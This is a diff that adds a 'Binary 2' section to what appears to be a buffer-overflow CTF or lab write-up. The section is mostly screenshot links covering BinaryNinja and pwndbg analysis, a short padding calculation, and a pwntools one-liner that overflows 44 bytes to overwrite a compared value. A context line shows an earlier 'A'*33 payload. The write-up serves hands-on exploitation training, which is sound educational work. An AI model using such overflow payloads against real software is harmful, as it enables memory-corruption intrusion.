@@ -247,11 +247,56 @@ python -c 'print("A"*33)' | ./bof
 
 
 
+### Binary 2
+
+![level2](level2.png)
+
+
+#### BinaryNinja - Static Analysis
+
+![analyzed_level2](analyzed_level2.png)
+
+
+#### Dynamic Analysis
+
+Where do we break?
+
+
+#### Pwndbg - Dynamic Analysis
+
+![level2_pwndbg](level2_pwndbg.png)
+
+
+#### Check the Compare
+
+![rax_level2](rax_level2.png)
+
+
+### Use Python
+
+![python_4c](python_4c.png)
+
+
+### Figure out padding
+
+1. L = 12th letter of the Alphabet
+2. 12*4 = 48
+3. 48-4 = 44
+4. 44 bytes is our padding
+5. 44-48 bytes is our desired value
+
+
+### Exploit
+
+```Python
+python2 -c 'from pwn import *; print("A"*44+p32(0xC15C0))'
+```
+
+![pwndbg_win_level2](pwndbg_win_level2.png)
 
 
 
-
-
+### Binary 3
 
 
 
